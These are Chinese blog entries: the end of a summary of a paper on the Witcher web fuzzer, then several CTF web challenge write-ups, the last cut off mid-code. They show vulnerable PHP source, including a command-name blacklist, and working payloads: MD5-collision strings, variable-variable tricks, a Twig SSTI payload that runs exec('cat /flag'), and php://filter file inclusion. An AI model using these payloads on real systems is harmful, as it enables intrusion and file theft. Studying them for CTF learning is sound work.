alt="image-20240415134316237"></p><p>Black Widow 和 WebFuzz 是2023对 Web 应用进行 fuzz 的工作，但它们主要关注 XSS 漏洞，因此本文只比较了其触发的代码行数，可以看出 Witcher 几乎占据绝对优势。W \B 列显示了 Witcher 发现的唯一行。W ∩B 显示了 Witcher 和其他扫描仪找到的行。B\W 列显示了其他工具找到的唯一行。</p><p><img src="/2024/04/13/WebFuzz/image-20240415134443402.png" alt="image-20240415134443402"></p><p>Witcher 的一些不足：首先是目前仅限于发现 SQL 和命令注入漏洞，而且在注入类漏洞中也只限于检测到单次请求的反射型漏洞，对于涉及多次请求的存储型漏洞，则无法精确判断具体是哪次输入触发漏洞。这种每次只 fuzz 一个 URL 的设计也使得它难以完整地感知 Web 应用的状态</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp9</title>
    <link href="/2024/03/04/WebWriteUp9/"/>
    <url>/2024/03/04/WebWriteUp9/</url>
    
    <content type="html"><![CDATA[<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p><img src="/2024/03/04/WebWriteUp9/image-20240304145510477.png" alt="image-20240304145510477"></p><p><img src="/2024/03/04/WebWriteUp9/image-20240304145532989.png" alt="image-20240304145532989"></p><p>页面源码提示这应该是一个md5相关的题，但除此之外没别的信息</p><p>抓包：</p><p><img src="/2024/03/04/WebWriteUp9/image-20240304145620647.png" alt="image-20240304145620647"></p><p>页面通过get方法读取了一个图片，应该就是左上角那个，对字符串进行base64解码</p><p>得到：MzUzNTM1MmU3MDZlNjc&#x3D;</p><p>再解码：3535352e706e67</p><p>16进制转字符：555.png</p><p>那么可以尝试用同样的方法获取index.php的源码：</p><p>index.php转16进制：696e6465782e706870</p><p>base64编码：Njk2ZTY0NjU3ODJlNzA2ODcw</p><p>再编码：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p>读取试试：</p><p><img src="/2024/03/04/WebWriteUp9/image-20240304150321950.png" alt="image-20240304150321950"></p><p>得到一串字符，解码后得到一段php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>要面临3个挑战：</p><ol><li>包含的文件不能含有flag</li><li>cmd参数能进行的命令注入大部分被过滤了</li><li>需要POST两个参数，且这两个参数的md5值相等，而且这两个参数会被强制类型转换成string</li></ol><p>漏洞利用：</p><p>注意正则表达式中的：|\\|\\\\|</p><ol><li>PHP 解析：<code>|\\|\\\\|</code> → <code>|\|\\|</code></li><li>正则表达式解析：<code>|\|\\|</code> → <code>||\|</code></li></ol><p>所以最后这个合起来并不是过滤的\和\\，而是|\</p><p>所以命令可以使用\进行关键词过滤的绕过，空格则用%20绕过</p><p>对于md5，查阅资料，这个以后记住用就行：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br>b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><p>所以构造payload：</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp8</title>
    <link href="/2024/02/22/WebWriteUp8/"/>
    <url>/2024/02/22/WebWriteUp8/</url>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><img src="/2024/02/22/WebWriteUp8/image-20240222191833504.png" alt="image-20240222191833504"></p><p>一个很精美的界面，查看页面源码之后并没有发现什么，而页面上的多数按钮都是回到第一页的，没啥作用，这种情况下，一般就得试试存不存在源码泄漏或者git泄漏了，这里使用githack工具</p><p><img src="/2024/02/22/WebWriteUp8/image-20240222193106747.png" alt="image-20240222193106747"></p><p>找到两个文件可疑文件：</p><p><img src="/2024/02/22/WebWriteUp8/image-20240222193127316.png" alt="image-20240222193127316"></p><p>在githack目录下找到这两个文件：</p><p><img src="/2024/02/22/WebWriteUp8/image-20240222193314861.png" alt="image-20240222193314861"></p><p><img src="/2024/02/22/WebWriteUp8/image-20240222193335081.png" alt="image-20240222193335081"></p><p>代码中使用了可变变量</p><p><strong>可变变量</strong></p><p>用一段简单的代码便于理解，代码中，三个都将输出hello world</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;<br><span class="hljs-variable">$$a</span> = <span class="hljs-string">&#x27;world&#x27;</span>; <span class="hljs-comment">//相当于创建了一个hello变量并赋值</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> <span class="hljs-subst">&#123;$$a&#125;</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> <span class="hljs-subst">$hello</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello world&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那么进行代码审计</p><ul><li><p>第一个foreach会把所有的POST的参数值作为变量名创建对应的变量</p><p>例如：传入flag&#x3D;flag，将会有$x &#x3D; flag, $y &#x3D; flag, $flag &#x3D; flag</p></li><li><p>第二个foreach会把所有的GET的参数值作为变量名创建对应的变量</p></li><li><p>第三个foreach用来检查GET的值中是否存在flag这个变量，但其本身不等于flag，若有，则输出hansome的值</p></li><li><p>第一个if用来判断GET和POST的传参不能有flag，这会儿输出yds</p></li><li><p>第二个if判断GET或POST的传参是否是flag，是的话输出is</p></li></ul><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>利用get</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#传入的get值会经过这。例:传入is=flag，得到$is=$flag.</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br><span class="hljs-comment">#用post或get传的参数必须是flag且值为flag</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后打印的是is，所以首先传入is&#x3D;flag，经过循环后，得到$x&#x3D;is,$y&#x3D;flag. 带进去变成$is&#x3D;$flag，也就是说在传入is&#x3D;flag后，就会有个flag变量，那么再传入flag&#x3D;flag，就能实现，且经过循环得到$flag&#x3D;$flag，不会影响</p><p>所以payload为：&#x2F;?is&#x3D;flag&amp;flag&#x3D;flag</p><p><img src="/2024/02/22/WebWriteUp8/image-20240222201944624.png" alt="image-20240222201944624"></p><p>在页面最下方得到flag</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#传入的get值会经过这。例:传入is=flag，得到$is=$flag.</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br><span class="hljs-comment">#get和post传参不能有flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>和第一种一样，这会儿需要get的参数不是flag，但构造yds&#x3D;flag，直接能绕过</p><p>所以payload为：&#x2F;?yds&#x3D;flag</p><p>此题中，若要利用hansome，需要传入flag !&#x3D; flag，相当于改变了flag的值，无法利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-comment">#git传入flag变量且值不为flag</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="/2024/02/22/WebWriteUp8/image-20240223142215534.png" alt="image-20240223142215534"></p><p>flag界面</p><p><img src="/2024/02/22/WebWriteUp8/image-20240223143251197.png" alt="image-20240223143251197"></p><p>hint界面</p><p><img src="/2024/02/22/WebWriteUp8/image-20240223143301506.png" alt="image-20240223143301506"></p><p>既然题目提到cookie，那么先用admin登录，在页面刷新抓cookie</p><p><img src="/2024/02/22/WebWriteUp8/image-20240223155214230.png" alt="image-20240223155214230"></p><p>既然存在一个POST值，那么尝试sql注入，但发现，输入啥就会回显啥，无法进行注入</p><h4 id="ssti注入（模版注入）"><a href="#ssti注入（模版注入）" class="headerlink" title="ssti注入（模版注入）"></a><strong>ssti注入（模版注入）</strong></h4><p><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911174631687-758048107.png" alt="img"></p><p>服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。</p><p>那么先进行注入测试，payload：49</p><p><img src="/2024/02/22/WebWriteUp8/image-20240223155312248.png" alt="image-20240223155312248"></p><p>观察返回的内容，</p><p><img src="/2024/02/22/WebWriteUp8/image-20240223155355940.png" alt="image-20240223155355940"></p><p>可以确定是服务器端类型</p><p>根据上表，可以看到有smarty，twig</p><p>那么进行尝试就行，网上找twig注入的模版，进行修改：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/22/WebWriteUp8/image-20240223155644972.png" alt="image-20240223155644972"></p><p>得到flag</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp7</title>
    <link href="/2024/02/17/WebWriteUp7/"/>
    <url>/2024/02/17/WebWriteUp7/</url>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p><img src="/2024/02/17/WebWriteUp7/image-20240217142814126.png" alt="image-20240217142814126"></p><p>给了个时区设置不安全的警告，尝试看源码的时候，会发现，页面每隔5s的在刷新</p><p>抓包看看</p><p><img src="/2024/02/17/WebWriteUp7/image-20240217143813098.png" alt="image-20240217143813098"></p><p>看到了一个奇怪的POST传参，结合警告来看，传的看起来是date函数和它的参数</p><p>那按照这个思路，也可以利用file_get_contents获取源码</p><p><img src="/2024/02/17/WebWriteUp7/image-20240217144621799.png" alt="image-20240217144621799"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里可以看到Test函数中写了__destruct方法，而函数禁用中并没有禁用unserialize()，并且输入参数用户可控，这样的话就会存在反序列化漏洞</p><p><img src="/2024/02/17/WebWriteUp7/image-20240217151146541.png" alt="image-20240217151146541"></p><p>构造序列化对象</p><p><img src="/2024/02/17/WebWriteUp7/image-20240217151236159.png" alt="image-20240217151236159"></p><p>但好像没有找到flag相关，但估摸着在tmp或者usr里</p><p><img src="/2024/02/17/WebWriteUp7/image-20240217151842384.png" alt="image-20240217151842384"></p><p>继续查看</p><p><img src="/2024/02/17/WebWriteUp7/image-20240217152046479.png" alt="image-20240217152046479"></p><p>得到flag</p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p><img src="/2024/02/17/WebWriteUp7/image-20240217152130167.png" alt="image-20240217152130167"></p><p>点击可以出现小猫小狗</p><p>尝试读取页面源码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=index.php<br></code></pre></td></tr></table></figure><p><img src="/2024/02/17/WebWriteUp7/image-20240217152827716.png" alt="image-20240217152827716"></p><p>通过这个报错，知道了存在文件包含漏洞（include函数），同时，看报错信息，需要把payload中的php删了</p><figure class="highlight awk"><table><tr><td 